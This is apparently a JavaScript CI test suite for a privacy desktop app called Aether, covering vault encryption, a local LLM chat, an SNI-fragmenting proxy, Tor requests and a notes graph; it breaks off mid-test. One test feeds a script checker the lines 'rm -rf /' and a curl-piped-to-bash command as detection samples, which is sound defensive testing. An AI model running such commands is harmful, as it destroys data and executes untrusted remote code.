"use strict";

const fs = require("node:fs");
const path = require("node:path");
const assert = require("node:assert");
let JSDOM;
try {
  JSDOM = require("jsdom").JSDOM;
} catch (err) {
  console.warn("⚠️ Warning: JSDOM require failed:", err.message);
}

console.log("=================================================");
console.log("🧪 [Aether CI/CD Test Suite] Starting test run...");
console.log("=================================================");

let passed = 0;
let failed = 0;

function runTest(name, fn) {
  try {
    fn();
    console.log(`  ✅ PASS: ${name}`);
    passed++;
  } catch (err) {
    console.error(`  ❌ FAIL: ${name}`);
    console.error(`     Error: ${err.message}`);
    failed++;
  }
}

async function runAsyncTest(name, fn) {
  try {
    await fn();
    console.log(`  ✅ PASS: ${name}`);
    passed++;
  } catch (err) {
    console.error(`  ❌ FAIL: ${name}`);
    console.error(`     Error: ${err.message}`);
    failed++;
  }
}

async function main() {
  // 1. Metadata Tests
  runTest("Package & Version Consistency", () => {
    const pkg = JSON.parse(fs.readFileSync(path.join(__dirname, "../package.json"), "utf8"));
    const ver = JSON.parse(fs.readFileSync(path.join(__dirname, "../version.json"), "utf8"));

    assert.strictEqual(pkg.name, "aether", "package.json name must be 'aether'");
    assert.strictEqual(pkg.version, "0.0.1", "package.json version must be '0.0.1'");
    assert.strictEqual(ver.name, "Aether", "version.json name must be 'Aether'");
    assert.strictEqual(ver.version, "0.0.1", "version.json version must be '0.0.1'");
    assert.ok(ver.url.includes("gitlab.com/jk9576/aether"), "GitLab URL must point to jk9576/aether");
  });

  // 2. Forbidden Term Audit (Zero tolerance for ladybird / ieumoffice / pblsketch / yggdrasil terminal / aetheum)
  runTest("Codebase Purity Audit (No forbidden legacy terms)", () => {
    const forbidden = ["ladybird", "ieumoffice", "pblsketch", "yggdrasil terminal", "aetheum"];
    const filesToCheck = [
      "package.json",
      "version.json",
      "out/renderer/browser.html",
      "out/renderer/terminal.html",
      "out/renderer/nibelungen.html",
      "out/renderer/ratatoskr.html",
      "out/renderer/fafnir.html",
      "out/renderer/mimisbrunnr.html",
      "out/renderer/heimdall.html",
      "out/renderer/adblock.html",
      "out/main/extensions/aetherum-browser.js",
      "out/main/extensions/aetherum-pages.js",
      "out/main/extensions/sleipnir.js",
      "out/main/extensions/nibelungen.js",
      "out/main/extensions/fafnir.js",
      "out/main/extensions/mimisbrunnr.js",
      "out/main/extensions/ratatoskr.js",
      "out/main/extensions/heimdall.js",
      "out/main/extensions/adblock.js"
    ];

    for (const relPath of filesToCheck) {
      const fullPath = path.join(__dirname, "..", relPath);
      if (!fs.existsSync(fullPath)) continue;
      const content = fs.readFileSync(fullPath, "utf8").toLowerCase();
      for (const term of forbidden) {
        assert.ok(!content.includes(term), `File ${relPath} contains forbidden legacy term: "${term}"`);
      }
    }
  });

  // 3. Fafnir Vault: AES-256-GCM Deep Cryptography & Edge Cases
  runTest("Fafnir Vault: Cryptographic Integrity & Edge Cases", () => {
    const {
      encryptBuffer,
      decryptBuffer,
      encryptFileToVault,
      decryptFileFromVault,
      listVaultFiles
    } = require("../out/main/extensions/fafnir");

    // Standard encryption & decryption
    const sample = Buffer.from("Nordic Privacy Zero-Knowledge Document 2026", "utf8");
    const pass = "SleipnirKey#2026!";
    const encrypted = encryptBuffer(sample, pass, "Doc.txt");
    assert.ok(encrypted.length > sample.length, "Ciphertext must include IV, tag, metadata, and data");

    const decrypted = decryptBuffer(encrypted, pass);
    assert.strictEqual(decrypted.plaintext.toString("utf8"), sample.toString("utf8"), "Decrypted data must match exactly");
    assert.strictEqual(decrypted.meta.filename, "Doc.txt");
    assert.strictEqual(decrypted.meta.cipher.toLowerCase(), "aes-256-gcm");

    // Edge Case: Wrong passphrase
    assert.throws(() => {
      decryptBuffer(encrypted, "WrongPassword123");
    }, /Unsupported state or unable to authenticate data|bad decrypt/i, "Must throw authentication failure on incorrect passphrase");

    // Edge Case: Tampered ciphertext (flip 1 byte in payload)
    const tampered = Buffer.from(encrypted);
    tampered[tampered.length - 5] ^= 0xff;
    assert.throws(() => {
      decryptBuffer(tampered, pass);
    }, /Unsupported state or unable to authenticate data|bad decrypt/i, "Must reject tampered ciphertext");

    // Edge Case: Zero-byte empty buffer
    const emptyBuf = Buffer.alloc(0);
    const emptyEnc = encryptBuffer(emptyBuf, pass, "empty.txt");
    const emptyDec = decryptBuffer(emptyEnc, pass);
    assert.strictEqual(emptyDec.plaintext.length, 0, "Must successfully encrypt and decrypt empty 0-byte file");

    // Edge Case: Non-existent file path
    assert.throws(() => {
      encryptFileToVault("/path/to/non_existent_file_xyz.docx", pass);
    }, /Source file does not exist/i, "Must throw on non-existent file path");
  });

  // 4. Mímisbrunnr: Intelligence Engine & Rule Diagnostic Edge Cases
  await runAsyncTest("Mímisbrunnr: Semantic Rules, Local LLM & Markdown Parser", async () => {
    const {
      MODEL_MLX_27B,
      MODEL_QWEN_7B,
      ALLOWED_MODEL_IDS,
      executeMimisbrunnrChat,
      getHardwareInfo,
      checkLocalLlm,
      offlineEmailSummarizer,
      offlineScriptDebugger,
      offlineKnowledgeResponder
    } = require("../out/main/extensions/mimisbrunnr");

    const hw = getHardwareInfo();
    assert.ok(hw && typeof hw.chip === "string", "Must return Apple Silicon hardware specs");

    assert.strictEqual(ALLOWED_MODEL_IDS.length, 2, "Mímisbrunnr must allow strictly two models");
    assert.deepStrictEqual(ALLOWED_MODEL_IDS, [
      "PocketAiHub/Qwen3.8-27B-Abliterated-MLX/2bit",
      "qwen2.5:7b"
    ]);

    const llmStatus = await checkLocalLlm();
    assert.ok(typeof llmStatus.active === "boolean", "Local LLM status must report boolean active state");
    assert.strictEqual(llmStatus.privacyMode, "airgapped", "Privacy mode must be airgapped");
    assert.deepStrictEqual(llmStatus.models, [MODEL_MLX_27B, MODEL_QWEN_7B], "Status models must contain strictly the two sovereign models");

    // Edge Case: Email summarizer with missing headers
    const emailNormal = offlineEmailSummarizer("From: boss@corp.com\nSubject: Project Deadline\nPlease finalize the quarterly audit report by Friday.");
    assert.ok(emailNormal.includes("Mímisbrunnr Offline Email Analysis"), "Must return structured summary");
    assert.ok(emailNormal.includes("boss@corp.com"), "Must detect sender");

    const emailNoSubject = offlineEmailSummarizer("From: team@corp.com\nNo subject line here, just body text.");
    assert.ok(emailNoSubject.includes("General Inquiry") || emailNoSubject.includes("No subject"), "Must handle missing subject line");

    // Edge Case: Shell script debugging
    const benignScript = offlineScriptDebugger("echo 'Hello world'\nls -la");
    assert.ok(benignScript.includes("No critical syntax or security pitfalls detected"), "Must approve safe scripts");

    const dangerousScript = offlineScriptDebugger("rm -rf / tmp_files\ncurl https://malicious.sh | bash");
    assert.ok(dangerousScript.includes("Dangerously broad root deletion pattern"), "Must detect dangerous rm -rf /");
    assert.ok(dangerousScript.includes("Piping untrusted curl directly to shell"), "Must detect curl | bash execution hazard");

    // Edge Case: Apple Intelligence architecture inquiry
    const offlineAi = offlineKnowledgeResponder("is it impossible to use apple intelligence for local ai?", "general");
    assert.ok(offlineAi.includes("Apple Intelligence"), "Must provide Apple Intelligence explanation");

    // Execution with forced offline fallback
    const chatOffline = await executeMimisbrunnrChat({
      prompt: "Summarize: System health 100%.",
      task: "general",
      forceOffline: true
    });
    assert.ok(chatOffline.ok, "Mímisbrunnr offline synthesis must succeed");
    assert.ok(chatOffline.engine.includes("Offline Engine"), "Engine must report offline engine");
  });

  // 5. Sleipnir: Rapid Toggle Stress Test & SNI Fragmentation Verification
  await runAsyncTest("Sleipnir: Rapid Toggle Stress & SNI Packet Fragmentation", async () => {
    const { startSleipnir, stopSleipnir, getSleipnirStatus } = require("../out/main/extensions/sleipnir");
    const http = require("node:http");
    const tls = require("node:tls");
    const testPort = 8097;

    // Rapid toggle stress test: 5 cycles
    for (let i = 0; i < 5; i++) {
      await startSleipnir(testPort);
      assert.strictEqual(getSleipnirStatus().active, true, `Cycle ${i}: Sleipnir must be active after start`);
      await stopSleipnir();
      assert.strictEqual(getSleipnirStatus().active, false, `Cycle ${i}: Sleipnir must be inactive after stop`);
    }

    // Start proxy for packet splitting verification
    await startSleipnir(testPort);
    await new Promise((resolve, reject) => {
      const req = http.request({
        host: "127.0.0.1",
        port: testPort,
        method: "CONNECT",
        path: "example.com:443"
      });
      req.on("connect", (_res, socket) => {
        const tlsSocket = tls.connect({ socket, servername: "example.com" }, () => {
          tlsSocket.end();
          resolve();
        });
        tlsSocket.on("error", reject);
      });
      req.on("error", reject);
      req.end();
    });

    const status = getSleipnirStatus();
    assert.ok(status.packetsFragmented >= 1, "Must fragment ClientHello packets");
    assert.ok(status.sniBypassed >= 1, "Must record SNI bypass events");
    await stopSleipnir();
    assert.strictEqual(getSleipnirStatus().active, false, "Must cleanly shutdown");
  });

  // 6. Ratatoskr: API Engine, SOCKS5 Tor Tunneling & SQLite DB
  await runAsyncTest("Ratatoskr: API Client, Tor Tunneling & SQLite Table Inspection", async () => {
    const { executeApiRequest, querySqliteDb, listSqliteTables } = require("../out/main/extensions/ratatoskr");

    // Standard HTTP API request
    const reqRes = await executeApiRequest({
      method: "GET",
      url: "https://1.1.1.1/dns-query?name=proton.me&type=A",
      headers: { "Accept": "application/dns-json" }
    });
    assert.ok(reqRes.ok, "DoH request must succeed");
    assert.strictEqual(reqRes.status, 200);

    // Tor SOCKS5 Tunneling (routes through local Tor on 127.0.0.1:9050 if active)
    const torRes = await executeApiRequest({
      method: "GET",
      url: "https://check.torproject.org/api/ip"
    });
    assert.ok(torRes.ok, "Tor check request must succeed");
    assert.strictEqual(torRes.status, 200);
    assert.ok(typeof torRes.data.IsTor === "boolean", "Must report boolean IsTor status");

    // Edge Case: Invalid URL format
    const badUrlRes = await executeApiRequest({ method: "GET", url: "not-a-valid-url" });
    assert.strictEqual(badUrlRes.ok, false, "Must fail gracefully on invalid URL");

    // SQLite operations with temp database
    const tempDb = path.join(__dirname, "temp_test.sqlite");
    try {
      if (fs.existsSync(tempDb)) fs.unlinkSync(tempDb);
      const createRes = querySqliteDb(tempDb, "CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, email TEXT);");
      assert.ok(createRes.ok, "CREATE TABLE must succeed");

      const insertRes = querySqliteDb(tempDb, "INSERT INTO users (name, email) VALUES ('Jeffrey Kim', 'jk9576@hanyang.ac.kr');");
      assert.ok(insertRes.ok, "INSERT must succeed");

      const selectRes = querySqliteDb(tempDb, "SELECT * FROM users;");
      assert.ok(selectRes.ok, "SELECT must succeed");
      assert.strictEqual(selectRes.rows.length, 1);
      assert.strictEqual(selectRes.rows[0].name, "Jeffrey Kim");

      const tablesRes = listSqliteTables(tempDb);
      assert.ok(tablesRes.ok, "listSqliteTables must succeed");
      assert.ok(tablesRes.rows.some(t => t.name === "users"), "Must discover 'users' table");

      // Edge Case: Malformed SQL syntax error
      const badSqlRes = querySqliteDb(tempDb, "SELECT * FROM non_existent_table_123;");
      assert.strictEqual(badSqlRes.ok, false, "Must catch SQL syntax/table errors");
      assert.ok(badSqlRes.error.length > 0);
    } finally {
      if (fs.existsSync(tempDb)) fs.unlinkSync(tempDb);
    }
  });

  // 7. Nibelungen: Knowledge Graph & Wikilink Engine
  runTest("Nibelungen: Vault Initialization & Bi-directional Wikilinks", () => {
    const {
      saveNote,
      listNotes,
      buildKnowledgeGraph,
      deleteNote
    } = require("../out/main/extensions/nibelungen");

    const testId = "ci-test-wikilink-node-" + Date.now();
    const testNote = saveNote({
      id: testId,
      title: "CI Pipeline Verification",
      tags: ["test", "ci"],
      content: "Linking to [[Architecture]] and [[Proton Mail Security]] from CI."
    });

    assert.strictEqual(testNote.title, "CI Pipeline Verification");
    const notes = listNotes();
    assert.ok(notes.length >= 3, "Vault must contain starter and saved notes");

    const graph = buildKnowledgeGraph([{ title: "Proton Mail", url: "https://mail.proton.me" }]);
    assert.ok(graph.nodes.length >= 3, "Graph must have node objects");
    assert.ok(graph.edges.length >= 1, "Graph must have edge connections");

    const edge = graph.edges.find(e => e.type === "wikilink");
    assert.ok(edge, "Graph must discover wikilink edges");

    deleteNote(testId);
  });

  // 8. DOM & Button Click Tests: Fafnir Vault (fafnir.html)
  if (JSDOM) {
    await runAsyncTest("DOM & Buttons: Fafnir Vault (Modal, Encrypt, Decrypt)", async () => {
      const fafnirHtml = fs.readFileSync(path.join(__dirname, "../out/renderer/fafnir.html"), "utf8");
      let decryptedTarget = null;
      let encryptedTarget = null;

      const mockHyperOffice = {
        fafnir: {
          list: async () => [
            { id: "test_doc.fafnir", filename: "Quarterly_Audit.docx", size: 10240, cipher: "AES-256-GCM" }
          ],
          encrypt: async (params) => {
            encryptedTarget = params;
            return { ok: true, vaultPath: "/tmp/Quarterly_Audit.docx.fafnir" };
          },
          decrypt: async (params) => {
            decryptedTarget = params;
            if (params.passphrase === "correct_pass") {
              return { ok: true, decryptedPath: "/Users/sushikim/Desktop/decrypted_Quarterly_Audit.docx" };
            }
            return { ok: false, error: "Unsupported state or unable to authenticate data" };
          }
        }
      };

      const dom = new JSDOM(fafnirHtml, { runScripts: "outside-only" });
      dom.window.hyperOffice = mockHyperOffice;
      dom.window.eval(fafnirHtml.match(/<script>([\s\S]*?)<\/script>/)[1]);

      // 1. Initial vault load
      await new Promise(r => setTimeout(r, 50));
      const fileRows = dom.window.document.querySelectorAll(".file-row");
      assert.strictEqual(fileRows.length, 1, "Must render file row from vault list");
      assert.ok(fileRows[0].textContent.includes("Quarterly_Audit.docx"), "Row must display filename");

      // 2. Click Decrypt to Desktop button
      const decBtn = fileRows[0].querySelector("button");
      assert.ok(decBtn, "Decrypt button must exist on row");
      decBtn.click();

      const modal = dom.window.document.getElementById("decryptModal");
      assert.strictEqual(modal.style.display, "flex", "Decrypt modal must open on click");
      assert.ok(dom.window.document.getElementById("modalFileTitle").textContent.includes("Quarterly_Audit.docx"));

      // 3. Test empty passphrase validation in modal
      const confirmBtn = dom.window.document.getElementById("modalConfirmBtn");
      const modalPass = dom.window.document.getElementById("modalPassphrase");
      const modalStatus = dom.window.document.getElementById("modalStatus");
      modalPass.value = "";
      confirmBtn.click();
      assert.strictEqual(modalStatus.style.display, "block");
      assert.ok(modalStatus.textContent.includes("Please enter"), "Must warn on empty passphrase");

      // 4. Test wrong passphrase in modal
      modalPass.value = "wrong_pass";
      confirmBtn.click();
      await new Promise(r => setTimeout(r, 50));
      assert.ok(modalStatus.textContent.includes("Decryption failed"), "Must show decryption failed error");

      // 5. Test correct passphrase in modal
      modalPass.value = "correct_pass";
      confirmBtn.click();
      await new Promise(r => setTimeout(r, 50));
      assert.ok(modalStatus.textContent.includes("Successfully decrypted"), "Must show decryption success");
      assert.strictEqual(decryptedTarget.vaultFileName, "test_doc.fafnir");

      // 6. Test Encrypt button validation
      const encBtn = dom.window.document.getElementById("btnEncrypt");
      const encSrc = dom.window.document.getElementById("encSrcPath");
      const encPass = dom.window.document.getElementById("encPass");
      const encStatus = dom.window.document.getElementById("encStatus");

      encSrc.value = "";
      encPass.value = "";
      encBtn.click();
      assert.ok(encStatus.textContent.includes("Please specify both"), "Must validate empty encryption inputs");

      encSrc.value = "/path/to/test.docx";
      encPass.value = "secret123";
      encBtn.click();
      await new Promise(r => setTimeout(r, 50));
      assert.ok(encStatus.textContent.includes("File encrypted into vault"), "Must show successful encryption status");
      assert.strictEqual(encryptedTarget.srcPath, "/path/to/test.docx");
    });

    // 9. DOM & Button Click Tests: Mímisbrunnr AI (mimisbrunnr.html)
    await runAsyncTest("DOM & Buttons: Mímisbrunnr AI (Engine Check, Mode Buttons, Chat)", async () => {
      const mimHtml = fs.readFileSync(path.join(__dirname, "../out/renderer/mimisbrunnr.html"), "utf8");
      let sentChatPayload = null;

      let activeTestModel = "PocketAiHub/Qwen3.8-27B-Abliterated-MLX/2bit";
      const mockHyperOffice = {
        mimisbrunnr: {
          status: async () => ({
            active: true,
            model: activeTestModel,
            models: ["PocketAiHub/Qwen3.8-27B-Abliterated-MLX/2bit", "qwen2.5:7b"],
            mlxProgress: { installed: true, downloading: false, percent: 100 },
            ollamaReady: true,
            endpoint: "http://127.0.0.1:8088"
          }),
          selectModel: async (m) => { activeTestModel = m; return { active: true, model: activeTestModel }; },
          hardware: async () => ({ chip: "Apple M4", memory: "16 GB Unified Memory", neuralEngine: "16-Core ANE" }),
          chat: async (payload) => {
            sentChatPayload = payload;
            return { ok: true, response: "### Analysis Complete\n- Item 1: Secure\n- Item 2: Verified" };
          }
        }
      };

      const dom = new JSDOM(mimHtml, { runScripts: "outside-only" });
      dom.window.hyperOffice = mockHyperOffice;
      dom.window.eval(mimHtml.match(/<script>([\s\S]*?)<\/script>/)[1]);

      // 1. Initial greeting syntax check: verify NO raw markdown ### in greeting bubble
      const initialGreeting = dom.window.document.querySelector(".msg-bubble");
      assert.ok(!initialGreeting.innerHTML.includes("### 🧠 Welcome"), "Greeting must NOT contain raw unrendered ### markdown syntax");
      assert.ok(initialGreeting.querySelector("h3"), "Greeting must contain formatted <h3> heading element");

      // 2. Mode buttons click test
      const modeButtons = dom.window.document.querySelectorAll(".mode-btn");
      assert.ok(modeButtons.length >= 5, "Must have mode presets including Full Control");

      const fullControlBtn = Array.from(modeButtons).find(b => b.dataset.task === "full_control");
      assert.ok(fullControlBtn, "Full Control mode button must exist");
      fullControlBtn.click();
      assert.ok(fullControlBtn.classList.contains("active"), "Full Control mode must become active");
      assert.ok(dom.window.document.getElementById("promptInput").placeholder.includes("Full Control"), "Placeholder must update for full control");

      const emailModeBtn = Array.from(modeButtons).find(b => b.dataset.task === "email");
      assert.ok(emailModeBtn, "Email mode button must exist");
      emailModeBtn.click();
      assert.ok(emailModeBtn.classList.contains("active"), "Email mode must become active");
      assert.ok(dom.window.document.getElementById("promptInput").placeholder.toLowerCase().includes("mail"), "Placeholder must update for email mode");

      // 3. Check Engine button click & strict 2-model dropdown check
      const checkEngineBtn = dom.window.document.getElementById("btnCheckEngine");
      assert.ok(checkEngineBtn, "Check Engine button must exist");
      checkEngineBtn.click();
      await new Promise(r => setTimeout(r, 50));
      assert.strictEqual(checkEngineBtn.textContent.trim(), "🔄 Check Engine", "Button text must restore after check");
      assert.strictEqual(dom.window.document.getElementById("labelModel").textContent, "Live: Qwen3.8-27B-Abliterated-MLX (2bit AWQ)");
      assert.ok(dom.window.document.getElementById("pillModel").classList.contains("active"));

      const selectModelEl = dom.window.document.getElementById("selectModel");
      const optionValues = Array.from(selectModelEl.options).map(o => o.value);
      assert.deepStrictEqual(optionValues, [
        "PocketAiHub/Qwen3.8-27B-Abliterated-MLX/2bit",
        "qwen2.5:7b"
      ], "Model dropdown must contain strictly the two requested models");

      // 4. Send button & message execution
      const promptInput = dom.window.document.getElementById("promptInput");
      const btnSend = dom.window.document.getElementById("btnSend");
      promptInput.value = "Review email headers for SPF and DKIM";
      btnSend.click();
      await new Promise(r => setTimeout(r, 50));

      assert.strictEqual(sentChatPayload.prompt, "Review email headers for SPF and DKIM");
      assert.strictEqual(sentChatPayload.task, "email");

      const messages = dom.window.document.querySelectorAll(".message");
      assert.ok(messages.length >= 3, "Must append user and assistant messages");
      const lastMsg = messages[messages.length - 1];
      assert.ok(lastMsg.querySelector("h3"), "Markdown response must render formatted <h3> heading");
      assert.strictEqual(lastMsg.querySelector("h3").textContent, "Analysis Complete");
      assert.ok(lastMsg.querySelectorAll("li").length >= 2, "Markdown response must render formatted <li> list items");
    });

    // 10. DOM & Button Click Tests: Ratatoskr API & DB Viewer (ratatoskr.html)
    await runAsyncTest("DOM & Buttons: Ratatoskr (View Toggling, Tor Preset, API Send, DB Runner)", async () => {
      const ratHtml = fs.readFileSync(path.join(__dirname, "../out/renderer/ratatoskr.html"), "utf8");
      let sentApiReq = null;
      let sentSql = null;

      const mockHyperOffice = {
        ratatoskr: {
          request: async (params) => {
            sentApiReq = params;
            return { ok: true, status: 200, statusText: "OK", duration: 85, data: { IsTor: true, IP: "192.42.116.45" } };
          },
          listTables: async () => ({ ok: true, rows: [{ name: "vault_entries" }, { name: "wikilinks" }] }),
          querySqlite: async (params) => {
            sentSql = params;
            return { ok: true, rows: [{ id: 1, title: "Proton Doc", size: 4096 }] };
          }
        }
      };

      const dom = new JSDOM(ratHtml, { runScripts: "outside-only" });
      dom.window.hyperOffice = mockHyperOffice;
      dom.window.eval(ratHtml.match(/<script>([\s\S]*?)<\/script>/)[1]);

      // 1. Tab switching buttons
      const btnTabApi = dom.window.document.getElementById("btnTabApi");
      const btnTabDb = dom.window.document.getElementById("btnTabDb");
      const viewApi = dom.window.document.getElementById("viewApi");
      const viewDb = dom.window.document.getElementById("viewDb");

      btnTabDb.click();
      assert.strictEqual(viewDb.style.display, "flex", "Database view must be visible");
      assert.strictEqual(viewApi.style.display, "none", "API view must be hidden");

      btnTabApi.click();
      assert.strictEqual(viewApi.style.display, "flex", "API view must be visible");
      assert.strictEqual(viewDb.style.display, "none", "Database view must be hidden");

      // 2. Preset: Tor Check link click
      dom.window.loadTorCheck();
      const apiUrl = dom.window.document.getElementById("apiUrl");
      assert.strictEqual(apiUrl.value, "https://check.torproject.org/api/ip", "Tor preset must fill URL");

      // 3. Send API Request button click
      const btnSend = dom.window.document.getElementById("btnSend");
      btnSend.click();
      await new Promise(r => setTimeout(r, 50));
      assert.strictEqual(sentApiReq.url, "https://check.torproject.org/api/ip");
      assert.strictEqual(dom.window.document.getElementById("respStatus").textContent, "200 OK");
      assert.ok(dom.window.document.getElementById("respBody").value.includes('"IsTor": true'));

      // 4. DB Inspector: Inspect Tables button click
      btnTabDb.click();
      const btnConnectDb = dom.window.document.getElementById("btnConnectDb");
      btnConnectDb.click();
      await new Promise(r => setTimeout(r, 50));
      const tableButtons = dom.window.document.getElementById("tableList").querySelectorAll("button");
      assert.strictEqual(tableButtons.length, 2, "Must list 2 SQLite tables");

      // 5. Click table button -> populates query & runs
      tableButtons[0].click();
      assert.strictEqual(dom.window.document.getElementById("sqlQuery").value, 'SELECT * FROM "vault_entries" LIMIT 50;');

      const btnRunQuery = dom.window.document.getElementById("btnRunQuery");
      btnRunQuery.click();
      await new Promise(r => setTimeout(r, 50));
      assert.ok(dom.window.document.getElementById("queryResults").innerHTML.includes("data-grid"), "Must render HTML data grid");
      assert.ok(dom.window.document.getElementById("queryResults").innerHTML.includes("Proton Doc"));
    });

    // 11. DOM & Button Click Tests: Aetherum Browser (browser.html)
    await runAsyncTest("DOM & Buttons: Aetherum Browser (Sleipnir Toggle, Tor Toggle, Navigation, Menus)", async () => {
      const browserHtml = fs.readFileSync(path.join(__dirname, "../out/renderer/browser.html"), "utf8");
      let sleipnirActive = true;
      let torActive = true;

      const mockHyperOffice = {
        sleipnir: {
          getStatus: async () => ({ active: sleipnirActive, port: 8087 }),
          toggle: async () => {
            sleipnirActive = !sleipnirActive;
            return { active: sleipnirActive };
          }
        },
        browser: {
          getTorStatus: async () => ({ torEnabled: torActive, active: torActive }),
          setTor: async (en) => {
            torActive = en;
            return { torEnabled: torActive, active: torActive };
          },
          getAetherumPage: async (p) => `<h1>Page ${p}</h1>`,
          summarize: async () => ({ ok: true, summary: "Page analysis summary from Gemini" }),
          saveDoc: async () => ({ ok: true })
        }
      };

      const dom = new JSDOM(browserHtml, { runScripts: "outside-only" });
      dom.window.hyperOffice = mockHyperOffice;
      dom.window.eval(browserHtml.match(/<script>([\s\S]*?)<\/script>/)[1]);

      // 1. Sleipnir Toggle Click
      const sleipnirToggle = dom.window.document.getElementById("sleipnirToggle");
      const sleipnirLabel = dom.window.document.getElementById("sleipnirLabel");
      assert.ok(sleipnirLabel.textContent.includes("Sleipnir: ON"), "Initial state must be ON");

      sleipnirToggle.click();
      await new Promise(r => setTimeout(r, 50));
      assert.ok(sleipnirLabel.textContent.includes("Sleipnir: OFF"), "Toggling must change label to OFF");
      assert.ok(sleipnirToggle.classList.contains("off"), "Toggling must add .off class");

      sleipnirToggle.click();
      await new Promise(r => setTimeout(r, 50));
      assert.ok(sleipnirLabel.textContent.includes("Sleipnir: ON"), "Second toggle must restore ON state");
      assert.ok(!sleipnirToggle.classList.contains("off"));

      // 2. Tor Toggle Click
      const torToggle = dom.window.document.getElementById("torToggle");
      const torLabel = dom.window.document.getElementById("torLabel");
      torToggle.click();
      await new Promise(r => setTimeout(r, 50));
      assert.ok(torLabel.textContent.includes("Tor: OFF"), "Tor toggle must switch to OFF");

      // 3. Dropdown Menu Toggles
      const btnSuiteMenu = dom.window.document.getElementById("btnSuiteMenu");
      const suiteDropdown = dom.window.document.getElementById("suiteDropdown");
      btnSuiteMenu.click();
      assert.ok(suiteDropdown.classList.contains("show"), "Suite dropdown must show on click");

      dom.window.document.dispatchEvent(new dom.window.MouseEvent("click"));
      assert.ok(!suiteDropdown.classList.contains("show"), "Clicking outside must close dropdown");

      // 4. Summarize Drawer Toggles
      const btnSummarize = dom.window.document.getElementById("btnSummarize");
      const aiDrawer = dom.window.document.getElementById("aiDrawer");
      const btnCloseDrawer = dom.window.document.getElementById("btnCloseDrawer");

      btnSummarize.click();
      assert.ok(aiDrawer.classList.contains("open"), "Summarize button must open AI drawer");
      btnCloseDrawer.click();
      assert.ok(!aiDrawer.classList.contains("open"), "Close drawer button must dismiss drawer");

      // 5. Go Button Navigation Normalization
      const urlInput = dom.window.document.getElementById("urlInput");
      const btnGo = dom.window.document.getElementById("btnGo");
      urlInput.value = "gitlab.com";
      btnGo.click();
      await new Promise(r => setTimeout(r, 50));
      assert.strictEqual(urlInput.value, "https://gitlab.com", "Must prepend https:// to bare domains");

      // 6. Tools Menu Toggle
      const btnToolsMenu = dom.window.document.getElementById("btnToolsMenu");
      const toolsDropdown = dom.window.document.getElementById("toolsDropdown");
      btnToolsMenu.click();
      assert.ok(toolsDropdown.classList.contains("show"), "Tools dropdown must show on click");
      dom.window.document.dispatchEvent(new dom.window.MouseEvent("click"));
      assert.ok(!toolsDropdown.classList.contains("show"), "Clicking outside must close tools dropdown");

      // 7. Save Document Button Click
      const btnSaveDoc = dom.window.document.getElementById("btnSaveDoc");
      btnSaveDoc.click();
      await new Promise(r => setTimeout(r, 60));
      assert.strictEqual(btnSaveDoc.textContent, "✓ Saved!", "Save button must display success confirmation");

      // 8. Home Button Click
      const btnHome = dom.window.document.getElementById("btnHome");
      btnHome.click();
      await new Promise(r => setTimeout(r, 50));
      assert.strictEqual(urlInput.value, "aetherum://welcome", "Home button must navigate to welcome page");

      // 9. Quick Link Click
      const quickLinks = dom.window.document.querySelectorAll(".quick-link");
      assert.ok(quickLinks.length >= 4, "Must render quick link bookmarks");
      quickLinks[0].click();
      await new Promise(r => setTimeout(r, 50));
      assert.strictEqual(urlInput.value, quickLinks[0].dataset.url, "Clicking quick link must navigate to target URL");

      // 10. Multi-Tab System: Creation, Switching, and Closing
      const btnNewTab = dom.window.document.getElementById("btnNewTab");
      const tabsContainer = dom.window.document.getElementById("tabsContainer");
      assert.ok(btnNewTab, "New tab button must exist");
      assert.strictEqual(tabsContainer.children.length, 1, "Initial browser tab count must be 1");

      btnNewTab.click();
      await new Promise(r => setTimeout(r, 50));
      assert.strictEqual(tabsContainer.children.length, 2, "Clicking new tab button must add a tab");

      let currentTabElements = tabsContainer.querySelectorAll(".tab-item");
      assert.ok(currentTabElements[1].classList.contains("active"), "Newly created tab must be active");

      // Navigate tab 2 to Proton Mail
      urlInput.value = "https://mail.proton.me";
      btnGo.click();
      await new Promise(r => setTimeout(r, 50));
      assert.strictEqual(urlInput.value, "https://mail.proton.me");

      // Switch back to tab 1 (query freshly rendered elements)
      currentTabElements = tabsContainer.querySelectorAll(".tab-item");
      currentTabElements[0].click();
      await new Promise(r => setTimeout(r, 50));
      currentTabElements = tabsContainer.querySelectorAll(".tab-item");
      assert.ok(currentTabElements[0].classList.contains("active"), "Tab 1 must become active upon click");
      assert.strictEqual(urlInput.value, quickLinks[0].dataset.url, "URL bar must reflect Tab 1 URL");

      // Close tab 2
      const closeButtons = tabsContainer.querySelectorAll(".tab-close");
      closeButtons[1].click();
      await new Promise(r => setTimeout(r, 50));
      assert.strictEqual(tabsContainer.children.length, 1, "Closing tab must decrement tab count");

      // 11. Redirection Simulation (mail.proton.me -> https://account.proton.me/mail)
      const activeWebview = dom.window.document.getElementById("contentWebview");
      const redirectEvent = new dom.window.CustomEvent("did-redirect-navigation");
      redirectEvent.url = "https://account.proton.me/mail";
      activeWebview.dispatchEvent(redirectEvent);
      assert.strictEqual(urlInput.value, "https://account.proton.me/mail", "did-redirect-navigation must update address bar upon redirection");
    });

    // 12. DOM & Button Click Tests: Nibelungen (nibelungen.html)
    await runAsyncTest("DOM & Buttons: Nibelungen (New Note, Auto-Save, Search, Delete, Sync)", async () => {
      const nibHtml = fs.readFileSync(path.join(__dirname, "../out/renderer/nibelungen.html"), "utf8");
      let savedNoteData = null;
      let deletedNoteId = null;

      const mockHyperOffice = {
        nibelungen: {
          getGraph: async () => ({
            nodes: [
              { id: "note-1", label: "Architecture", type: "note" },
              { id: "note-2", label: "ProtonMail", type: "note" }
            ],
            edges: [{ source: "note-1", target: "note-2", type: "wikilink" }]
          }),
          listNotes: async () => [
            { id: "note-1", title: "Architecture", tags: ["core"], content: "# Architecture\nSubsystems: [[ProtonMail]]" },
            { id: "note-2", title: "ProtonMail", tags: ["privacy"], content: "# ProtonMail\nZero-knowledge email" }
          ],
          saveNote: async (n) => { savedNoteData = n; return n; },
          deleteNote: async (id) => { deletedNoteId = id; return { ok: true }; }
        }
      };

      const dom = new JSDOM(nibHtml, { runScripts: "outside-only" });
      dom.window.hyperOffice = mockHyperOffice;
      dom.window.requestAnimationFrame = (cb) => setTimeout(cb, 16);
      dom.window.cancelAnimationFrame = (id) => clearTimeout(id);
      // Provide canvas mock context for physics simulation
      const canvas = dom.window.document.getElementById("graphCanvas");
      canvas.getContext = () => ({
        clearRect: () => {},
        beginPath: () => {},
        moveTo: () => {},
        lineTo: () => {},
        arc: () => {},
        fill: () => {},
